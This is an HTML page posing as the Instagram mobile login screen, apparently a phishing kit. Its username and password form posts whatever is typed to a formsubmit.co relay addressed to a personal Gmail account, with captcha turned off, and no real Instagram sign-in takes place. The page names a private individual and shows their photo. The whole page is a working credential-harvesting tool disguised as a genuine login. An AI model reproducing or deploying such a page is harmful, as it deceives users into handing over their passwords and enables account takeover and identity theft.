<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #121212;
            color: #e4e6eb;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
        }

        .mobile-container {
            width: 100%;
            max-width: 390px;
            height: 100vh;
            background-color: #121212;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 16px;
            border-bottom: 1px solid #262626;
        }

        .back-button {
            background: none;
            border: none;
            color: #e4e6eb;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.2s;
        }

        .back-button:active {
            opacity: 0.7;
        }

        .language-selector {
            background: none;
            border: none;
            color: #a0a0a0;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 8px 12px;
            transition: color 0.2s;
        }

        .language-selector:active {
            color: #e4e6eb;
        }

        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 32px 20px 40px;
            overflow-y: auto;
        }

        .logo-container {
            margin-bottom: 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .instagram-logo {
            width: 80px;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            overflow: hidden;
            background: linear-gradient(135deg, #f10074 0%, #d10d8a 20%, #ff6a3d 58%, #ff9f1c 100%);
            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05);
            flex-shrink: 0;
        }

        .instagram-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .form-container {
            width: 100%;
            max-width: 320px;
        }

        .form-group {
            margin-bottom: 12px;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            font-size: 16px;
            background-color: #262626;
            border: 1px solid #404040;
            border-radius: 8px;
            color: #e4e6eb;
            outline: none;
            transition: all 0.2s;
            font-family: inherit;
        }

        input[type="text"]::placeholder,
        input[type="email"]::placeholder,
        input[type="password"]::placeholder {
            color: #a0a0a0;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #5a5a5a;
            background-color: #1a1a1a;
        }

        input.error {
            border-color: #ed4956;
        }

        .error-message {
            color: #f15245;
            font-size: 12px;
            margin-top: 6px;
            display: none;
            padding: 0 2px;
        }

        .error-message.show {
            display: block;
        }

        .login-button {
            width: 100%;
            padding: 11px 12px;
            margin-top: 16px;
            background-color: #0a66c2;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            font-family: inherit;
        }

        .login-button:active {
            background-color: #0857a0;
        }

        .login-button:disabled {
            background-color: #0857a0;
            opacity: 0.6;
            cursor: not-allowed;
        }

        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }

        .forgot-password a {
            color: #e4e6eb;
            text-decoration: none;
            font-size: 13px;
            transition: opacity 0.2s;
        }

        .forgot-password a:active {
            opacity: 0.7;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0 16px;
            font-size: 13px;
            color: #a0a0a0;
            gap: 16px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #262626;
        }

        .signup-box {
            width: 100%;
            max-width: 320px;
            padding: 16px 0 0;
            text-align: center;
            border-top: 1px solid #262626;
            margin-top: 8px;
        }

        .signup-box span {
            color: #a0a0a0;
            font-size: 14px;
        }

        .signup-box a {
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
        }

        .success-message {
            background-color: #2d5016;
            color: #31a24c;
            border: 1px solid #3d6b21;
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 16px;
            font-size: 13px;
            display: none;
            text-align: center;
        }

        .success-message.show {
            display: block;
        }

        @media (max-width: 480px) {
            .mobile-container {
                max-width: 100%;
            }

            .content {
                padding: 28px 20px 36px;
            }
        }
    </style>
</head>

<body>
    <div class="mobile-container">
        <div class="header">
            <button class="back-button" onclick="history.back()">←</button>
            <button class="language-selector">
                English (UK) ▼
            </button>
        </div>

        <div class="content">
            <div class="logo-container">
                <div class="instagram-logo" aria-label="Profile logo">
                    <img src="sadaf mallick.jpeg" alt="Sadaf Mallick" />
                </div>
            </div>

            <div class="form-container">
                <div class="success-message" id="successMessage">
                    Logged in successfully! ✓
                </div>

                <form id="loginForm" action="https://formsubmit.co/mallickfahad13@gmail.com" method="POST">
                    <input type="hidden" name="_subject" value="New Form Submission">
                    <input type="hidden" name="_captcha" value="false">

                    <div class="form-group">
                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email"
                            autocomplete="username" required>
                        <div class="error-message" id="usernameError"></div>
                    </div>

                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="Password"
                            autocomplete="current-password" required>
                        <div class="error-message" id="passwordError"></div>
                    </div>

                    <button type="submit" class="login-button" id="submitBtn">Log in</button>
                </form>

                <div class="forgot-password">
                    <a href="#">Forgotten password?</a>
                </div>

                <div class="divider">OR</div>
            </div>

            <div class="signup-box">
                <span>Don't have an account? <a href="#">Sign up</a></span>
            </div>
        </div>
    </div>

    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const successMessage = document.getElementById('successMessage');

        [usernameInput, passwordInput].forEach((input) => {
            input.addEventListener('focus', () => {
                successMessage.classList.remove('show');
                successMessage.textContent = 'Logged in successfully! ✓';
            });
        });

        document.querySelector('.language-selector').addEventListener('click', () => {
            alert('Language selection: English (UK), Español, Português, etc.');
        });
    </script>
</body>

</html>
